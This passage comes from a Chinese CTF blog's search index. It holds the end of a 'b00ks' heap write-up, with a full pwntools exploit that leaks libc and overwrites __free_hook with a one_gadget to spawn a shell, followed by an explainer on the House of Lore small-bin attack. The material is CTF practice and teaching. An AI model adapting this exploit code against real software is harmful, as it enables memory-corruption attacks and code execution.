<h5 id="泄露libc-base"><a href="#泄露libc-base" class="headerlink" title="泄露libc_base"></a>泄露libc_base</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload&#x3D;&#39;a&#39;*0xb0+p64(0x1)+p64(books_one+0x38)+p64(books_one+0x40)+p64(0xffff)</span><br><span class="line">edit(1,payload)</span><br><span class="line">payload&#x3D;&#39;a&#39;*32</span><br><span class="line">change(payload)</span><br><span class="line"></span><br><span class="line">printf()</span><br><span class="line">sh.recvuntil(&#39;Name: &#39;)</span><br><span class="line">name_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.recvuntil(&#39;Description: &#39;)</span><br><span class="line">description_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">print (&#39;name_addr:&#39; +hex(name_addr))</span><br><span class="line">print(&#39;description_addr:&#39; +hex(description_addr))</span><br><span class="line">#libc_base&#x3D;description_addr-0x587010</span><br><span class="line">libc_base&#x3D;name_addr-0x5a9010</span><br><span class="line">print(&#39;libc_base:&#39; +hex(libc_base))</span><br></pre></td></tr></table></figure>

<h5 id="获取指针"><a href="#获取指针" class="headerlink" title="获取指针"></a>获取指针</h5><p>我们还需要获取__free_hook指针和execve（‘/bin/sh’）的偏移，这里我们用one_gadget来获取。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">free_hook&#x3D;libc.symbols[&#39;__free_hook&#39;]+libc_base</span><br><span class="line">execve_addr&#x3D;libc_base+offset</span><br></pre></td></tr></table></figure>

<h5 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h5><p>最后我们只需要通过修改我们伪造的b00k1的description为free_hook的指针地址，将b00k2的description填入execve的地址，然后delete b00k2就好了。</p>
<h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># coding&#x3D;&#39;utf-8&#39;</span><br><span class="line">from pwn import *</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;b00ks&#39;)</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;libc.so.6&#39;)</span><br><span class="line"></span><br><span class="line">def create(name_size,name,des_size,description):</span><br><span class="line">        sh.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">        sh.sendline(str(1))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(name_size))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(name)</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(des_size))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(description)</span><br><span class="line"></span><br><span class="line">def delete (number) :</span><br><span class="line">        sh.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">        sh.sendline(str(2))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(number))</span><br><span class="line"></span><br><span class="line">def edit(number,data) :</span><br><span class="line">        sh.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">        sh.sendline(&#39;3&#39;)</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(number))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(data)</span><br><span class="line"></span><br><span class="line">def printf () :</span><br><span class="line">        sh.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">        sh.sendline(&#39;4&#39;)</span><br><span class="line"></span><br><span class="line">def change (payload) :</span><br><span class="line">        sh.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">        sh.sendline(&#39;5&#39;)</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;:&#39;)</span><br><span class="line">payload&#x3D;&#39;a&#39;*32</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">create(30,&#39;bb&#39;,255,&#39;cc&#39;)</span><br><span class="line">create(0x21000,&#39;bb&#39;,0x21000,&#39;cc&#39;)</span><br><span class="line">printf()</span><br><span class="line">sh.recvuntil(&#39;a&#39;*32)</span><br><span class="line">books_one&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">print (&#39;books_one:&#39; +hex(books_one))</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0xb0+p64(0x1)+p64(books_one+0x38)+p64(books_one+0x40)+p64(0xffff)</span><br><span class="line">edit(1,payload)</span><br><span class="line">payload&#x3D;&#39;a&#39;*32</span><br><span class="line">change(payload)</span><br><span class="line"></span><br><span class="line">printf()</span><br><span class="line">sh.recvuntil(&#39;Name: &#39;)</span><br><span class="line">name_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.recvuntil(&#39;Description: &#39;)</span><br><span class="line">description_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">print (&#39;name_addr:&#39; +hex(name_addr))</span><br><span class="line">print(&#39;description_addr:&#39; +hex(description_addr))</span><br><span class="line">#libc_base&#x3D;description_addr-0x587010</span><br><span class="line">libc_base&#x3D;name_addr-0x5a9010</span><br><span class="line">print(&#39;libc_base:&#39; +hex(libc_base))</span><br><span class="line"></span><br><span class="line">#offset&#x3D;0x45216</span><br><span class="line">offset&#x3D;0x4526a</span><br><span class="line">free_hook&#x3D;libc.symbols[&#39;__free_hook&#39;]+libc_base</span><br><span class="line">execve_addr&#x3D;libc_base+offset</span><br><span class="line">print(&#39;free_hook:&#39; +hex(free_hook))</span><br><span class="line">print(&#39;execve_addr:&#39; +hex(execve_addr))</span><br><span class="line"></span><br><span class="line">payload&#x3D;p64(free_hook)</span><br><span class="line">edit(1,payload)</span><br><span class="line">payload&#x3D;p64(execve_addr)</span><br><span class="line">edit(2,payload)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">delete(2)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>参考:<a href="http://noonegroup.xyz/posts/1a1c1b4a/" target="_blank" rel="noopener external nofollow noreferrer">http://noonegroup.xyz/posts/1a1c1b4a/</a></p>
<p>参考:<a href="https://bbs.pediy.com/thread-225611.htm" target="_blank" rel="noopener external nofollow noreferrer">https://bbs.pediy.com/thread-225611.htm</a></p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>heap</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>House of Lore</title>
    <url>/2020/10/01/House-of-Lore/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/09/30/W3FUqZ86Y1Hzej4.jpg" alt="5f73fd4f94a60.jpg"></p>
<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>House of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关。</p>
<p>House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。</p>
<p>House of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。</p>
<h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>如果在 malloc 的时候，申请的内存块在 small bin 范围内，那么执行的流程如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">   If a small request, check regular bin.  Since these &quot;smallbins&quot;</span><br><span class="line">   hold one size each, no searching within bins is necessary.</span><br><span class="line">   (For a large request, we need to wait until unsorted chunks are</span><br><span class="line">   processed to find best fit. But for small ones, fits are exact</span><br><span class="line">   anyway, so we can check now, which is faster.)</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">if (in_smallbin_range(nb)) &#123;</span><br><span class="line">    &#x2F;&#x2F; 获取 small bin 的索引</span><br><span class="line">    idx &#x3D; smallbin_index(nb);</span><br><span class="line">    &#x2F;&#x2F; 获取对应 small bin 中的 chunk 指针</span><br><span class="line">    bin &#x3D; bin_at(av, idx);</span><br><span class="line">    &#x2F;&#x2F; 先执行 victim&#x3D; last(bin)，获取 small bin 的最后一个 chunk</span><br><span class="line">    &#x2F;&#x2F; 如果 victim &#x3D; bin ，那说明该 bin 为空。</span><br><span class="line">    &#x2F;&#x2F; 如果不相等，那么会有两种情况</span><br><span class="line">    if ((victim &#x3D; last(bin)) !&#x3D; bin) &#123;</span><br><span class="line">        &#x2F;&#x2F; 第一种情况，small bin 还没有初始化。</span><br><span class="line">        if (victim &#x3D;&#x3D; 0) &#x2F;* initialization check *&#x2F;</span><br><span class="line">            &#x2F;&#x2F; 执行初始化，将 fast bins 中的 chunk 进行合并</span><br><span class="line">            malloc_consolidate(av);</span><br><span class="line">        &#x2F;&#x2F; 第二种情况，small bin 中存在空闲的 chunk</span><br><span class="line">        else &#123;</span><br><span class="line">            &#x2F;&#x2F; 获取 small bin 中倒数第二个 chunk 。</span><br><span class="line">            bck &#x3D; victim-&gt;bk;</span><br><span class="line">            &#x2F;&#x2F; 检查 bck-&gt;fd 是不是 victim，防止伪造</span><br><span class="line">            if (__glibc_unlikely(bck-&gt;fd !&#x3D; victim)) &#123;</span><br><span class="line">                errstr &#x3D; &quot;malloc(): smallbin double linked list corrupted&quot;;</span><br><span class="line">                goto errout;</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F; 设置 victim 对应的 inuse 位</span><br><span class="line">            set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">            &#x2F;&#x2F; 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span><br><span class="line">            bin-&gt;bk &#x3D; bck;</span><br><span class="line">            bck-&gt;fd &#x3D; bin;</span><br><span class="line">            &#x2F;&#x2F; 如果不是 main_arena，设置对应的标志</span><br><span class="line">            if (av !&#x3D; &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">            &#x2F;&#x2F; 细致的检查</span><br><span class="line">            check_malloced_chunk(av, victim, nb);</span><br><span class="line">            &#x2F;&#x2F; 将申请到的 chunk 转化为对应的 mem 状态</span><br><span class="line">            void *p &#x3D; chunk2mem(victim);</span><br><span class="line">            &#x2F;&#x2F; 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff</span><br><span class="line">            alloc_perturb(p, bytes);</span><br><span class="line">            return p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从下面的这部分我们可以看出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 获取 small bin 中倒数第二个 chunk 。</span><br><span class="line">bck &#x3D; victim-&gt;bk;</span><br><span class="line">&#x2F;&#x2F; 检查 bck-&gt;fd 是不是 victim，防止伪造</span><br><span class="line">if (__glibc_unlikely(bck-&gt;fd !&#x3D; victim)) &#123;</span><br><span class="line">    errstr &#x3D; &quot;malloc(): smallbin double linked list corrupted&quot;;</span><br><span class="line">    goto errout;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 设置 victim 对应的 inuse 位</span><br><span class="line">set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">&#x2F;&#x2F; 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span><br><span class="line">bin-&gt;bk &#x3D; bck;</span><br><span class="line">bck-&gt;fd &#x3D; bin;</span><br></pre></td></tr></table></figure>

<p>漏洞点在<code>bck = victim-&gt;bk</code>，如果我们可以控制<code>victim</code>的bk指针，将其修改为伪造好的fake chunk地址。接下来执行<code>bin-&gt;bk = bck</code>和 <code>bck-&gt;fd = bin</code>，就会将fake chunk加入到small bin链表里。接下来只要malloc相应大小的chunk，就可以拿到fake chunk。这里要注意的是<code>bck-&gt;fd != victim</code>，需要进行绕过。</p>
<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_lore-zh/#_2" target="_blank" rel="noopener external nofollow noreferrer">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_lore-zh/#_2</a></p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>heap</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
        <tag>house of lore</tag>
      </tags>
  </entry>
</search>
